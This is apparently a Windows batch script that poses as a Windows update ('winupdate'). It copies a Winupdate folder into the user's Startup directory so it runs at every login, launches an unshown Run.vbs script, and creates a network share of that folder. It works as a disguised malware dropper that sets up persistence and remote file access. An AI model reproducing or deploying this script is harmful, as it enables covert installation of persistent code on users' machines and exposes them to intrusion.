@echo off
title winupdate.run
cd ..
move Winupdate %userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
cd %userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Winupdate
Run.vbs
net share winupdate="C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Winupdate"
echo Winupdate setup complete...
timeout 3 >nul
exit
